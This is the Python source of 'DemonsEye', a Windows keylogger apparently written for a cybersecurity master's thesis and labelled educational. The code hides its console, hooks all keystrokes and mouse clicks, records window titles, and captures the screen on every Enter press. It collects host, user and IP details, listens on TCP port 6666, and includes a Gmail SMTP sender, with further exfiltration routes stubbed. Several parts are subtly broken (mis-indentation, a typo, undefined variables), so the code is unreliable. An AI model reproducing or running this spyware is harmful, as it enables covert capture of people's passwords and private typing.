#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#-----------------------------------------------------------------------------------------------------------
#    ____                             _       _____             _  __          _
#   |  _ \  ___ _ __ ___   ___  _ __ ( )___  | ____|   _  ___  | |/ /___ _   _| | ___   __ _  __ _  ___ _ __
#   | | | |/ _ \ '_ ` _ \ / _ \| '_ \|// __| |  _|| | | |/ _ \ | ' // _ \ | | | |/ _ \ / _` |/ _` |/ _ \ '__|
#   | |_| |  __/ | | | | | (_) | | | | \__ \ | |__| |_| |  __/ | . \  __/ |_| | | (_) | (_| | (_| |  __/ |
#   |____/ \___|_| |_| |_|\___/|_| |_| |___/ |_____\__, |\___| |_|\_\___|\__, |_|\___/ \__, |\__, |\___|_|
#                                                  |___/                 |___/         |___/ |___/
#-----------------------------------------------------------------------------------------------------------
# Name:         demonseye.py
# Purpose:      ES - Desarrollo de un keylogger para el TFM del Master en Ciberseguridad de La Salle 2019
#               EN - Development of a keylogger for the TFM of the Master in Cybersecurity of La Salle 2019
#
# Author:       Gabriel Marti
# email:        gabimarti at gmail dot com
# GitHub:       https://github.com/gabimarti
# Created:      19/05/2019
# Copyright:    (c) Gabriel Marti Fuentes 2019
# License:      GPL
#
# Features:     * Record keystrokes
#               * Periodic screen capture
#               * Send data to a remote computer with Monitor App (to do)
#               * Send data to an email account (to do)
#               * Send data to a Twitter account (to do)
#               * Paste data to a Paste service/site (to do)
#
# Required:     Install with "pip install module-name-required"
#               pywin32, pyWinhook, win32gui, requests, wxPython
#
# Notes:        This code has been tested, developed and designed to work in a Windows environment.
#               Its purpose is only educational.
# Updates:
#
#-----------------------------------------------------------------------------------------------------------
#
#   Reminder for future features to do:
#           - auto clone app / copy to windows tmp
#           - install in win registry
#           - send info to paste service
#           - send info to twitter
#           - hide app
#           - command line params: install registry, hide, etc.
#           - system disk info
#           - memory info
#           - server witch sockets connection
#

import atexit
import base64
import datetime
import getpass
import glob
import logging
from optparse import OptionParser
import os
import platform
import pythoncom
import pyWinhook as pyHook
import smtplib
import socket
import sys
import tempfile
import threading
import time
import urllib.request
import win32console
import win32gui
import wx

########################################################
# CONSTANTES - CONSTANTS
########################################################
APPNAME = "DemonsEye"           # Just a name
VERSIONS = "1.0"                # Version
LOGGING_LEVEL = logging.DEBUG   # Log Level Debug. Can be -> DEBUG, INFO, WARNING, ERROR, CRITICAL
CRLF = '\n'                     # salto de linea - line feed
KLGPRE = 'klg_'                 # prefijo nombre ficheros de log - prefix name for log files
KLGEXT = '.dek'                 # extension nombre ficheros keylogger - extension file name for keylogger
KEYCODE_EXIT = 7                # CTRL + G > combinación especial para cerrar keylogger - key to close keylogger


########################################################
# VARIABLES GLOBALES - GLOBAL VARIABLES
########################################################

# Contador de teclas presionadas - key counter : Future use. At the moment without utility.
key_counter = 0

# Control evento anterior - Previous event control
# Used to detect when the user changes the window or application.
old_event = None

# Buffer de caracteres. hasta que no se llena, no se graba en el fichero en disco de esta manera se evitan escrituras
# contínuas a disco por cada tecla pulsada cuando de supera el limite de key_max_chars se graba el buffer a disco.
# Character buffer. until it is full, it is not written to the file on disk in this way continuous writes to disk are
# avoided for each key pressed when the key_max_chars limit is exceeded the buffer is written to disk
key_max_chars = 25
key_buffer = ''

# Control de tamaño de archivo (en bytes) que activa que se envie a almacenamiento remoto cuando el tamaño del fichero
# de keylog supera este tamaño entoces se envia el fichero seguidamente se borra y se crea un nuevo fichero de keylog.
# File size control (in bytes) that activates to be sent to remote storage when the size of the keylog file exceeds
# this size, then the file is sent, then it is deleted and a new keylog file is created.
file_size_trigger = 4096

# Ruta y nombre archivo keylog. Se asigna el nombre en la función create_keylog_file()
# Path and file name keylog. The name is assigned in the create_keylog_file () function
keylog_name = ''

# Control de threads - Thread Control
threadLock = threading.Lock()
threadList = []


########################################################
# CLASES - CLASSES
########################################################

# Clase multihilo con metodo que toma captura de pantalla y despues la envia a servicios remotos
# Threading class to capture screenshot and send to remote services
class ScreenShootThread (threading.Thread):
    def __init__(self, screen_filename):
        threading.Thread.__init__(self)
        self.screen_file = screen_filename

   def run(self):
        logging.info("Guardado captura " + self.screen_file)
        app = wx.App()  # Need to create an App instance before doing anything
        screen = wx.ScreenDC()
        size_x, size_y = screen.GetSize()
        bmp = wx.EmptyBitmap(size_x, size_y, -1)
        mem = wx.MemoryDC(bmp)
        mem.Blit(0, 0, size_x, size_y, screen, 0, 0)
        del mem  # libera memoria que contiene captura de imagen
        del app  # libera objeto de instancia de la aplicación
        bmp.SaveFile(self.screen_file, wx.BITMAP_TYPE_PNG)
        loggin.info("Fin captura " + self.screen_file)
        # Send screenshot to remote servers
        # ... pending ...


# Clase multihilo que pone un servidor a la escucha para recibir peticiones del Monitor y
# crea un cliente para la respuesta
# Threading class to listen Monitor petitions and create clients for response

# Server constants
SERVER_IP = ''
SERVER_PORT = 6666
SERVER_BUFFER_SIZE = 64
MAGIC_MESSAGE = 'REVNT05TIEVZRSBLRVlMT0dHRVI='

class ClientThread(threading.Thread):
    def __init__(self, conn, ip, port):
        threading.Thread.__init__(self)
        self.conn = conn
        self.ip = ip
        self.port = port
        logging.info("Recibida petición de Monitor desde " + ip + ":" + str(port))

    def run(self):
        while True:
            data = self.conn.recv(2048)
            logging.info("El monitor ha enviado:", data)
            if data == MAGIC_MESSAGE:
                message = "Conexion establecida"
                self.conn.send(message)
                # Inicia comunicación inversa para enviar datos al Monitor
                # Starts reverse comunication to send data to Monitor
                # ... pending ...
            else:
                message = "No tiene permiso"
                self.conn.send(message)
                break


class ServerListenerThread (threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.name = APPNAME
        self.threads = []
        logging.debug('Creando servidor en IP '+ip+' y puerto '+port)

    def run(self):
        tcpServer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tcpServer.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        tcpServer.bind((SERVER_IP, SERVER_PORT))

        while True:
            tcpServer.listen(5)                 # 5 clients are more than enough. Normally there is only 1 monitor.
            logging.info("Demon's Eye Keylogger server : Waiting connection from Monitor...")
            (conn, (ip, port)) = tcpServer.accept()
            newthread = ClientThread(conn, ip, port)
            newthread.start()
            self.threads.append(newthread)      # Inicia thread de respuesta - Starts client response thread


########################################################
# FUNCIONES - FUNCTIONS
########################################################

'''
Control parametros linea de comando, para instalar, configurar, ajustar.
NO IMPLEMENTADO TODAVIA
'''
def parse_params():
    usage = "Uso: %prog [options] arg1 arg2"
    parser = OptionParser(usage=usage)
    parser.add_option("-v", "--verbose",
                      action="store_true", dest="verbose", default=True,
                      help="make lots of noise [default]")
    parser.add_option("-q", "--quiet",
                      action="store_false", dest="verbose",
                      help="be vewwy quiet (I'm hunting wabbits)")
    parser.add_option("-f", "--filename",
                      metavar="FILE", help="write output to FILE")
    parser.add_option("-m", "--mode",
                      default="intermediate",
                      help="interaction mode: novice, intermediate, "
                           "or expert [default: %default]")
    return



# función que hace "paste" del contenido del fichero de keylog
# https://pastecode.xyz/api
# https://pastecode.xyz/api/create
#       text=[your paste text]
#       title=[title]
#       name=[name]
#       private=1
#       lang=[language] -> lang=text
#       expire=[minutes]
#
def paste_file():

    return paste_id



# función de envio de información por email (solo para depuración)
def send_email(message):
    try:
        # Datos
        email_from_addr = '***@gmail.com'
        email_to_addrs = '***@gmail.com'
        email_username = '***@gmail.com'
        email_password = '****'

        # Enviando el correo
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(email_username, email_password)
        server.sendmail(email_from_addr, email_to_addrs, message)
        server.quit()

    except:
        logging.error('No he podido enviar mensaje')
        pass


# Oculta la ventana de la aplicación - Hide the application window
def hide_console():
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True


# Obtiene la ip externa - Get the external ip
def get_external_ip():
    return urllib.request.urlopen('https://ident.me').read().decode('utf8')


# Añade información inicial al fichero de keylog - Add initial information to the keylog file
def register_system_info():
    global key_buffer

    key_buffer += '[SYSTEM INFO BEGIN]' + CRLF
    key_buffer += 'cpu=' + cpu + CRLF
    key_buffer += 'os=' + operating_system + CRLF
    key_buffer += 'hostname=' + hostname + CRLF
    key_buffer += 'username=' + username + CRLF
    key_buffer += 'localip=' + localip + CRLF
    key_buffer += 'externalip=' + externalip + CRLF
    key_buffer += 'executable=' + execname + CRLF
    key_buffer += 'extension=' + extension + CRLF
    key_buffer += 'drive=' + driveunit + CRLF
    key_buffer += 'selfpathandfilename=' + keylog_name + CRLF
    key_buffer += 'datetime=' + datetime.datetime.now().strftime("%Y-%m-%d %H:%M") + CRLF
    key_buffer += '[SYSTEM INFO END]' + CRLF + CRLF
    return True


# Guarda el nombre de la ventana activa y lo añade al fichero de keylog
# Save the name of the active window and add it to the keylog file
def register_window_name(text):
    global key_buffer
    key_buffer += CRLF + CRLF + '[WINDOW NAME] ' + text + CRLF
    logging.debug('Window Name '+text)
    return True


# Registra una captura de pantalla, añade el nombre al fichero de keylog y seguidamente inicia un thread para su
# grabación en disco y envio al servicio externo.
# Register a screenshot, add the name to the keylog file and then start a thread for recording to disk and send
# it to the external service.
def capture_screen():
    global key_buffer
    tmp_folder = tempfile.gettempdir() + "\\"
    screen_file = tmp_folder + 'scr' + datetime.datetime.now().strftime("%y%m%d%H%M") + '.png'
    key_buffer += CRLF + CRLF + '[SCREENSHOT] ' + screen_file + CRLF
    pantalla = ScreenShootThread(screen_file)
    pantalla.start()
    return


# Ejecuta las acciones necesarias para enviar el fichero de keylog a los diferentes recursos o servicios
# que se hayan definido.
# Execute the necessary actions to send the keylog file to the different resources or services that have been defined.
def send_keylog_file():
    global keylog_name
    '''
    Aqui envia el fichero al servidor  o servicios configurados
    Hacer un 'paste' en un servidor
    Publicar un tweet en cuenta privada con la url del paste
    Opcionalmente hace envio por email para pruebas
    '''
    return True


# Borra todos los ficheros temporales del keylog - Delete all temporary keylog files
def delete_keylog_tempfile(pattern = None):
    if pattern == None:                     # Si no se recibe patron, por defecto borra todos los ficheros de keylog
        pattern = KLGPRE+"*"+KLGEXT         # If no pattern is received, by default it deletes all keylog files

    folder_files = tempfile.gettempdir() + "\\" + pattern
    for file_remove in glob.glob(folder_files):
        logging.info('Delete Temporal file: ' + file_remove)
        os.remove(file_remove)

    return


# Crea fichero de keylog - Create keylog file
def create_keylog_file():
    global keylog_name, key_buffer

    # Crea fichero de keylog en la carpeta temporal del usuario
    # Create keylog file in the user's temporary folder
    prefix = KLGPRE + datetime.datetime.now().strftime("%y%m%d%H%M")
    ftemp, keylog_name = tempfile.mkstemp(KLGEXT, prefix)
    logging.info('Create keylogger file ' + keylog_name)
    f = open(keylog_name, 'w+')
    f.close()

    key_buffer = ''                     # Nos aseguramos de tener el buffer vacio - Empty buffer
    register_system_info()              # Guardamos información general del sistema - Save system info
    return True


# Vacia el buffer del teclado sobre el fichero de disco - Empty the keyboard buffer over the disk file
def flush_key_buffer_to_disk():
    global key_buffer, keylog_name

    # Añade buffer a fichero de disco - Append to file
    f = open(keylog_name, 'a')
    f.write(key_buffer)
    f.close()

    key_buffer = ''
    return True


# En caso de teclas especiales, retorna True para las que queramos que queden registradas
# o False para las que no deseemos que queden registradas.
# si no encuentra la tecla en la lista, retorna True por defecto
# para poder registrar teclas desconocidas hasta el momento
def save_special_control_key(event):
    switcher = {
        'TAB': True, 'LSHIFT': False, 'RSHIFT': False, 'CAPITAL': True, 'LCONTROL': True, 'RCONTROL': True,
        'LMENU': True, 'RMENU': True, 'LWIN': False, 'RETURN': True
    }
    return switcher.get(event.Key.upper(), True)


# Añade tecla al buffer y si este esta lleno se vacia al disco - Adds key to buffer
def add_key_to_buffer(event):
    global key_buffer, key_max_chars, key_counter
    key = event.Ascii

    # asigna tecla. si es una tecla especial asigna string definiendo tipo de tecla
    # si se desea mostrar el espacio como [SPACE] se debe de indicar (key < 33)
    # en la condicion inferior, sino se mostrara un espacio en blanco tal cual.
    if (key < 32) or (key > 126):
        if save_special_control_key(event):
            ckey = '[' + event.Key.upper() + ']'
            # Cada vez que se pulsa RETURN añade salto de linea y hace captura de pantalla
            # With each press of RETURN add the line break and take a screenshot.
            if ckey == '[ENTER]' or ckey == '[RETURN]':
                ckey += CRLF
                capture_screen()
        else:
            ckey = ''
    else:
        ckey = chr(key)

    key_buffer += ckey

    # incrementa contador de teclas (de momento sin uso definido) - inc key counter. without use at the moment
    if len(ckey) > 0:
        key_counter += 1

    # si buffer esta lleno lo vacia y envia el fichero en caso de ser necesario
    if len(key_buffer) > key_max_chars:
        flush_key_buffer_to_disk()
        send_keylog_file()

    return True


# control eventos de ratón
# no se registran eventos de raton excepto los cambios de ventana
def on_mouse_event(event):
    global old_event

    # si el usuario cambia de ventana, la registra
    if (old_event == None or event.WindowName != old_event.WindowName) and event.WindowName != None:
        register_window_name(repr(event.WindowName))

    old_event = event

    return True


# control eventos de teclado
def on_keyboard_event(event):
    global key_buffer, key_counter, old_event

    # debug code
    logging.debug('Time: ' + repr(event.Time))
    logging.debug('MessageName: ' + repr(event.MessageName) +' Message: ' + repr(event.Message))
    logging.debug('Window: ' + repr(event.Window) + ' WindowName: ' + event.WindowName)
    logging.debug('Ascii: ' + repr(event.Ascii) + repr(chr(event.Ascii)))
    logging.debug('Key: ' + repr(event.Key) + ' KeyID: ' + repr(event.KeyID))
    logging.debug('ScanCode: ' + repr(event.ScanCode) + ' Extended: ' + repr(event.Extended))
    logging.debug('Injected: ' + repr(event.Injected) + ' Alt: ' + repr(event.Alt))
    logging.debug('Transition: ' + repr(event.Transition))

    # Si presiona combinación especial para salir y desactivar el KeyLogger
    # If especial key to close keylogger is pressed
    if event.Ascii == KEYCODE_EXIT:
        msg = 'Cerrando aplicación por combinación especial de tecla ' + repr(event.Ascii)
        logging.info(msg)
        key_buffer += CRLF + CRLF + "[" + msg + "]" + CRLF
        sys.exit(0)

    # Si el usuario cambia de ventana, la registra
    # If user change active window
    if (old_event == None or event.WindowName != old_event.WindowName) and event.WindowName != None:
        register_window_name(repr(event.WindowName))

    # guarda caracter en el buffer - save key to buffer
    add_key_to_buffer(event)

    # Guarda evento actual para comparar con el siguiente y poder controlar si se mantienen pulsadas teclas especiales
    # o saber si se cambia de ventana.
    # Saves current event info to compare with next one.
    old_event = event

    return True

# Función que ejecutará al cerrar el programa - Whe program is closed
def on_close_program():
    global key_buffer, threadList

    # registra en fichero de log el cerrado del programa con fecha y hora
    key_buffer += CRLF + CRLF
    key_buffer += '[CLOSING PROGRAM]' + CRLF
    key_buffer += 'datetime=' + datetime.datetime.now().strftime("%Y-%m-%d %H:%M") + CRLF
    # se asegura de vaciar buffer
    flush_key_buffer_to_disk()
    # envia ultimo fichero de log de teclas
    send_keylog_file()
    # ejecuta captura de pantalla
    capture_screen()

    # espera que finalicen todos los threads que pueda haber activos
    for thr in threadList:
        thr.join()

    # borra ficheros temporales

    logging.shutdown()
    return


########################################################
# MAIN
########################################################

# Establece log de depuración - Set debug log
logFormat = '%(asctime)s %(levelname)s:%(message)s'
logDateFmt = '%d/%m/%Y %I:%M:%S %p'
logging.basicConfig(filename='DEKlogger.log',filemode='w',level=LOGGING_LEVEL,format=logFormat,datefmt=logDateFmt)

# Inicializa variables con información del sistema y el usuario - Init some useful variables
cpu = platform.processor()
operating_system = platform.platform()
hostname = socket.gethostname()
username = getpass.getuser()
localip = socket.gethostbyname(hostname)
externalip = get_external_ip()
execname = sys.argv[0]                              # modo alternativo > execname = os.path.realpath(__file__)
extension = os.path.splitext(__file__)[1]
driveunit = os.path.splitdrive(__file__)[0]

# Parsea parametros recibidos - Parse parameters
parse_params()

# Oculta ventana de aplicación - Hide console Window
hide_console()

# Borra todos los archivos de keylog antiguos (si existen) - Delete old keylog files if exists
delete_keylog_tempfile()

# Crea el archivo que registra las teclas - Create new keylog file
create_keylog_file()

# Crea el objeto hook manager - Creates new hook manager
hm = pyHook.HookManager()

# Registra callbacks de control de eventos - Register event callbacks
hm.MouseAllButtonsDown = on_mouse_event
hm.KeyDown = on_keyboard_event

# Establece el hook de eventos de ratón y teclado - Sets hook for Mouse and Keyboard
hm.HookMouse()
hm.HookKeyboard()

# Registra handler de la función que se ejecutará al terminar la aplicación
# Handler to do actions when application is closed
atexit.register(on_close_program)

# Crea Servidor a la escucha de peticiones TCP del Monitor
# Create server that listens TCP petitions from Monitor
server = ServerListenerThread()
server.start()

# Espera indefinidamente hasta que se produce combinación de salida del keylogger - Wait indefinitely
pythoncom.PumpMessages()
